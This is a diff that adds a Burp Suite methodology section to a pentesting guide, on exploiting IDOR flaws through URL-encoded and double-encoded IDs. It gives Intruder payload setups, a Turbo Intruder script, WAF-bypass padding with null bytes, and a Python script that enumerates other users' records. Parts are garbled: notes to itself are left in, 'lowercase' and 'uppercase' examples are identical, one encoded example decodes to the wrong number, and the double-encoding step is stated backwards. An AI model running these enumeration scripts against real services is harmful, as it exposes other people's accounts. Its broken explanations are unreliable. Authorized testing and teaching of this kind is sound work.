@@ -5696,3 +5696,632 @@ Look for these signs of successful exploitation:
 
 ---
 
+# 🔍 **Bug #11: URL Encoding IDOR - Complete Burp Suite Methodology**
+
+## 📋 **Understanding Bug #11 - URL Encoded IDOR**
+**Bug #11** refers to testing IDOR vulnerabilities using **URL encoding** techniques. When an application accepts encoded values, it might decode them before processing, potentially bypassing input filters or authorization checks.
+
+---
+
+## 🎯 **Target Scenarios**
+Look for these patterns:
+- `GET /api/user/100` → Test `/api/user/%31%30%30`
+- `POST /api/document?id=100` → Test `id=%31%30%30`
+- JSON/XML APIs accepting encoded values
+- Applications with WAF/input filters
+
+---
+
+## 🛠️ **PHASE 1: Reconnaissance in Burp**
+
+### **Step 1.1: Configure Burp Suite**
+```
+Proxy → Intercept → Turn intercept ON
+Target → Site map → Add to scope
+```
+
+### **Step 1.2: Map the Application**
+1. Browse normally while recording
+2. Pay special attention to:
+   - Numeric IDs in URLs (`/user/123`)
+   - Parameters in POST bodies (`user_id=456`)
+   - File paths (`/download/789.pdf`)
+   - API endpoints (`/api/v1/orders/1001`)
+
+### **Step 1.3: Identify Potential Targets**
+Use **Burp Engagement Tools**:
+```
+Right-click request → Engagement Tools → 
+- Find Comments
+- Find References
+- Discover Content
+```
+
+---
+
+## 🔍 **PHASE 2: Manual Testing with Repeater**
+
+### **Step 2.1: Basic URL Encoding Tests**
+
+#### **Test Case A: Simple Numeric Encoding**
+Original Request:
+```
+GET /api/user/100 HTTP/1.1
+Host: example.com
+Cookie: session=abc123
+```
+
+Modified Request (Repeater):
+```
+GET /api/user/%31%30%30 HTTP/1.1
+Host: example.com
+Cookie: session=abc123
+```
+
+**URL Encoding Table for Numbers:**
+```
+0 = %30    5 = %35
+1 = %31    6 = %36
+2 = %32    7 = %37
+3 = %33    8 = %38
+4 = %34    9 = %39
+```
+
+### **Step 2.2: Multiple Encodings in Repeater**
+
+#### **Test different positions:**
+```
+1. Full encoding: /api/user/%31%30%30
+2. Partial encoding: /api/user/1%30%30
+3. Mixed encoding: /api/user/%31%300
+4. Leading encoding: /api/user/%31%300%30
+```
+
+#### **Burp Repeater Setup:**
+```
+# Send to Repeater (Ctrl+R)
+# Modify the encoded values
+# Send and compare responses
+```
+
+---
+
+## 🤖 **PHASE 3: Automated Testing with Intruder**
+
+### **Step 3.1: Intruder Basic Setup**
+
+1. **Send request to Intruder** (Ctrl+I)
+2. **Select attack type**: Sniper or Battering ram
+3. **Mark payload position**:
+```
+GET /api/user/§100§ HTTP/1.1
+```
+
+### **Step 3.2: Create URL Encoding Payloads**
+
+#### **Method A: Built-in Encoder**
+```
+Payloads tab → 
+Payload type: Custom iterator
+Add positions:
+- Position 1: 1,2,3,4,5,6,7,8,9,0
+- Position 2: 1,2,3,4,5,6,7,8,9,0
+- Position 3: 1,2,3,4,5,6,7,8,9,0
+
+Process: URL-encode each position
+```
+
+#### **Method B: Pre-computed Payload List**
+Create payloads.txt:
+```
+%31%30%30  (100)
+%31%30%31  (101)
+%31%30%32  (102)
+%32%30%30  (200)
+%39%39%39  (999)
+```
+
+#### **Method C: Using Burp's Payload Processing**
+```
+Payloads tab →
+Add → Add from list → Numbers (1-1000)
+
+Payload Processing:
+1. Add: Add prefix → "%"
+2. Add: Add prefix → "3" [for each digit? Better to use:]
+   Actually, use custom encoder:
+
+Better approach:
+Payload Processing Rules:
+1. Convert to string
+2. Add: URL-encode key characters
+3. Or use: Add custom iterator
+```
+
+### **Step 3.3: Advanced Intruder Configuration**
+
+#### **Attack Types for URL Encoding:**
+
+**Sniper** - Test one encoded value at a time:
+```
+GET /api/user/§ENCODED_ID§
+Payloads: %31%30%30, %31%30%31, %32%30%30
+```
+
+**Pitchfork** - Test multiple encoded parts:
+```
+GET /api/user/%§31§%§30§%§30§
+Payload set 1: 31,32,33 (first digit)
+Payload set 2: 30,31,32 (second digit)
+Payload set 3: 30,31,32 (third digit)
+```
+
+**Cluster Bomb** - All combinations:
+```
+GET /api/user/%§31§%§30§%§30§
+Will generate 1000 combinations (10×10×10)
+```
+
+### **Step 3.4: Grep - Match for Analysis**
+
+```
+Intruder → Options → Grep - Match
+Add strings to identify successful hits:
+- "Welcome"
+- "Profile"
+- "Account"
+- "200 OK"
+- Your username
+- "Unauthorized" (for false positives)
+- "Access Denied" (negative indicator)
+
+Grep - Extract:
+- Extract response length
+- Extract response title
+- Extract status code
+```
+
+---
+
+## 🎯 **PHASE 4: Advanced Testing Techniques**
+
+### **Step 4.1: Double URL Encoding**
+
+If application decodes once, try double encoding:
+
+```
+Original: 100
+URL encode: %31%30%30
+Double encode: %2531%2530%2530
+```
+
+**Double Encoding Process:**
+```
+1. Take value: 100
+2. First encode: %31%30%30
+3. Encode the % signs: %25 becomes %
+Final: %2531%2530%2530
+```
+
+#### **Burp Intruder Setup for Double Encoding:**
+```
+Payload: 100,101,102
+Payload Processing:
+1. URL-encode all characters → %31%30%30
+2. URL-encode all characters again → %2531%2530%2530
+```
+
+### **Step 4.2: Mixed Encoding Techniques**
+
+**Test different encoding styles:**
+```
+Standard:  /user/%31%30%30
+Lowercase: /user/%31%30%30
+Uppercase: /user/%31%30%30 (same)
+Alternating: /user/%31%30%30
+
+Non-ASCII: Try UTF-8 encoding
+- 100 in UTF-8: \u0031\u0030\u0030
+- URL encoded UTF-8: %C4%B1 etc. (doesn't work well for numbers)
+```
+
+### **Step 4.3: Path-based URL Encoding**
+
+```
+Original: /api/user/100/profile
+Test:     /api/user/%31%30%30/profile
+Test:     /api/user/100/%70%72%6F%66%69%6C%65 (encode 'profile')
+Test:     /%61%70%69/%75%73%65%72/%31%30%30 (encode everything)
+```
+
+---
+
+## 🔬 **PHASE 5: Response Analysis**
+
+### **Step 5.1: Using Comparer**
+
+```
+1. Select baseline response (valid user)
+2. Select test response
+3. Right-click → Send to Comparer
+4. Compare for differences:
+   - Content length
+   - Status codes
+   - Response time
+   - Specific strings
+```
+
+### **Step 5.2: Automating Detection with Extensions**
+
+**Install Burp Extensions:**
+```
+Extender → BApp Store → Install:
+1. Turbo Intruder - For high-speed attacks
+2. HTTP Request Smuggler - For encoding edge cases
+3. Autorize - For authorization checks
+4. AuthMatrix - For permission testing
+5. JSON Web Tokens - If IDs in JWT
+```
+
+### **Step 5.3: Turbo Intruder Script for URL Encoding**
+
+```python
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=5,
+                           requestsPerConnection=100,
+                           pipeline=False)
+    
+    # Generate encoded numbers 1-1000
+    for i in range(1, 1001):
+        # Convert to string and URL encode each digit
+        encoded = ''.join(['%' + hex(ord(d))[2:].zfill(2).upper() 
+                          for d in str(i)])
+        
+        engine.queue(target.req, encoded)
+        
+def handleResponse(req, interesting):
+    if '200 OK' in req.response:
+        table.add(req)
+```
+
+---
+
+## 🎭 **PHASE 6: Context-Specific Testing**
+
+### **Step 6.1: JSON/XML APIs**
+
+**JSON Request:**
+```
+POST /api/user/data HTTP/1.1
+Content-Type: application/json
+
+{"user_id": 100}
+```
+
+**Test with URL Encoded JSON:**
+```
+POST /api/user/data HTTP/1.1
+Content-Type: application/json
+
+{"user_id": "%31%30%30"}
+
+Some APIs might decode this automatically!
+```
+
+**XML Request:**
+```
+POST /api/user/data HTTP/1.1
+Content-Type: application/xml
+
+<user><id>100</id></user>
+```
+
+**Test with Encoded XML:**
+```
+POST /api/user/data HTTP/1.1
+Content-Type: application/xml
+
+<user><id>%31%30%30</id></user>
+```
+
+### **Step 6.2: Query Parameters**
+
+```
+Original: /api/data?user=100&type=profile
+Test:     /api/data?user=%31%30%30&type=profile
+Test:     /api/data?user=100&type=%70%72%6F%66%69%6C%65
+Test:     /api/data?%75%73%65%72=%31%30%30&%74%79%70%65=%70%72%6F%66%69%6C%65
+```
+
+### **Step 6.3: POST Form Data**
+
+```
+POST /api/update HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+user_id=100&action=view
+```
+
+**Test encoded:**
+```
+POST /api/update HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+user_id=%31%30%30&action=%76%69%65%77
+```
+
+---
+
+## 📊 **PHASE 7: Advanced Analysis Techniques**
+
+### **Step 7.1: Response Time Analysis**
+
+Use **Burp Intruder** with **Response time analysis**:
+
+```
+Options → Response Completion → 
+- Set timeout appropriately
+- Track response times in results table
+
+Look for:
+- Valid IDs: Consistent response times
+- Invalid IDs: Quick rejections
+- Encoded values: Different timing patterns
+```
+
+### **Step 7.2: Content Length Analysis**
+
+Export Intruder results and analyze in Excel:
+```python
+# Sample analysis script
+import csv
+from collections import Counter
+
+with open('intruder_results.csv') as f:
+    reader = csv.DictReader(f)
+    lengths = [r['Length'] for r in reader]
+    
+    # Find unique content lengths
+    length_counts = Counter(lengths)
+    unique_lengths = [l for l, c in length_counts.items() if c < 10]
+    
+    print(f"Potential hits with unique lengths: {unique_lengths}")
+```
+
+### **Step 7.3: Automated Scanning with Active Scanner**
+
+```
+Right-click request → Do an active scan
+Scope: Selected insertion points only
+Insertion points: 
+- URL path parameters
+- Query string parameters
+- Body parameters
+- Cookie values
+
+Scan configurations:
+- Enable "Insert malicious payloads"
+- Check "URL encoding" under payload types
+```
+
+---
+
+## 🛡️ **PHASE 8: Bypassing WAF/Protections**
+
+### **Step 8.1: WAF Bypass Techniques**
+
+**Case Variation:**
+```
+Normal: %31%30%30
+Mixed case: %31%30%30 (same for hex)
+Some WAFs: Try %6d%6f%63%6b (mock) - not applicable for numbers
+```
+
+**Alternative Encodings:**
+```
+UTF-8: Try overlong UTF-8 for '/'
+- Not applicable for numbers
+- For path: /api/user/%31%30%30
+
+Unicode:
+- %u0031%u0030%u0030 (not standard URL encoding)
+```
+
+**Padding Techniques:**
+```
+Add extra characters:
+/user/%31%30%00%30 (null byte)
+/user/%31%30%0a%30 (line feed)
+/user/%31%30%20%30 (space)
+```
+
+### **Step 8.2: Using Burp's Decoder**
+
+```
+Decoder tab → 
+1. Enter value: 100
+2. Encode as: URL
+3. Copy result: %31%30%30
+4. Encode again: URL all
+5. Copy result: %2531%2530%2530
+```
+
+---
+
+## 📝 **PHASE 9: Documentation & Reporting**
+
+### **Step 9.1: Saving Evidence**
+
+**Save requests/responses:**
+```
+Right-click request → Save item
+Include:
+- Full request headers
+- Full response
+- Timestamp
+- Notes on finding
+```
+
+**Screenshots:**
+```
+1. Baseline response (authorized access)
+2. Encoded request response (unauthorized access)
+3. Highlight differences
+```
+
+### **Step 9.2: Generate Report**
+
+```
+Project options → Reporting
+Create new report:
+- Include only confirmed findings
+- Add remediation advice
+- Include request/response pairs
+- Add severity ratings
+```
+
+### **Step 9.3: Proof of Concept Script**
+
+```python
+import requests
+import urllib.parse
+
+def test_url_encoded_idor(base_url, original_id, target_id):
+    """
+    Test for URL encoded IDOR vulnerability
+    """
+    session = requests.Session()
+    session.cookies.set('session', 'your_session_cookie')
+    
+    # Encode the target ID
+    encoded_id = ''.join([f'%{ord(d):02X}' for d in str(target_id)])
+    
+    # Test endpoint
+    url = f"{base_url}/api/user/{encoded_id}"
+    
+    response = session.get(url)
+    
+    if response.status_code == 200:
+        print(f"[+] Potential IDOR found! ID: {target_id}")
+        print(f"    Encoded: {encoded_id}")
+        print(f"    Response length: {len(response.text)}")
+        
+# Test sequence
+for test_id in [101, 102, 103, 200, 500]:
+    test_url_encoded_idor("https://example.com", 100, test_id)
+```
+
+---
+
+## 🎯 **PHASE 10: Advanced Tools & Techniques**
+
+### **Step 10.1: Burp Collaborator for Blind IDOR**
+
+If IDOR triggers blind actions:
+```
+1. Generate Collaborator payload
+2. Encode the Collaborator URL
+3. Inject in ID parameter
+4. Monitor Collaborator for interactions
+```
+
+### **Step 10.2: Custom Intruder Payloads**
+
+Create complex payloads with Python:
+
+```python
+# Generate encoded payload variations
+for i in range(1, 101):
+    num = str(i)
+    
+    # Standard encoding
+    std_enc = ''.join([f'%{ord(d):02X}' for d in num])
+    print(std_enc)
+    
+    # Double encoding
+    dbl_enc = urllib.parse.quote(std_enc)
+    print(dbl_enc)
+    
+    # Mixed case (not applicable for numbers)
+    
+    # With padding
+    padded = f"%00{std_enc}"
+    print(padded)
+```
+
+### **Step 10.3: Using Burp's Intruder with Multiple Encodings**
+
+**Payload Processing Rules:**
+```
+1. Add: Add raw payload (100)
+2. Add: URL-encode all characters → %31%30%30
+3. Add: Add prefix → % (for double? No, better:)
+
+Better sequence for double encoding:
+Rule 1: URL-encode all characters → %31%30%30
+Rule 2: URL-encode all characters → %2531%2530%2530
+```
+
+---
+
+## ✅ **CHECKLIST FOR BUG #11 TESTING**
+
+### **Pre-Testing**
+- [ ] Add target to Burp scope
+- [ ] Configure proxy settings
+- [ ] Set up session handling rules
+- [ ] Install relevant extensions
+
+### **Manual Testing**
+- [ ] Test basic URL encoding on single parameter
+- [ ] Test multiple positions in request
+- [ ] Test different encoding levels
+- [ ] Test with valid and invalid IDs
+- [ ] Document baseline responses
+
+### **Automated Testing**
+- [ ] Configure Intruder with encoding payloads
+- [ ] Set up grep matches
+- [ ] Run through all payload positions
+- [ ] Analyze results for anomalies
+- [ ] Verify findings manually
+
+### **Advanced Testing**
+- [ ] Test double encoding
+- [ ] Test mixed encoding techniques
+- [ ] Test in different contexts (JSON, XML)
+- [ ] Test with WAF bypass techniques
+- [ ] Test for blind IDOR scenarios
+
+### **Reporting**
+- [ ] Document each finding with evidence
+- [ ] Include request/response pairs
+- [ ] Provide remediation steps
+- [ ] Rate severity based on impact
+- [ ] Create proof of concept
+
+---
+
+## 🚨 **COMMON PITFALLS TO AVOID**
+
+1. **Don't assume** all servers decode URL encoding the same way
+2. **Don't ignore** response size differences
+3. **Don't forget** to test POST parameters too
+4. **Don't overlook** cookies and headers
+5. **Don't skip** baseline testing
+6. **Don't ignore** rate limiting
+7. **Don't forget** to clear cookies when testing
+8. **Don't test** without authorization
+
+---
+
+## 📚 **RESOURCES FOR FURTHER LEARNING**
+
+- **Burp Suite Documentation**: portswigger.net/burp/documentation
+- **OWASP IDOR Guide**: owasp.org/IDOR
+- **PortSwigger IDOR Labs**: portswigger.net/web-security/access-control
+- **URL Encoding Reference**: w3schools.com/tags/ref_urlencode.asp
+
+---
+
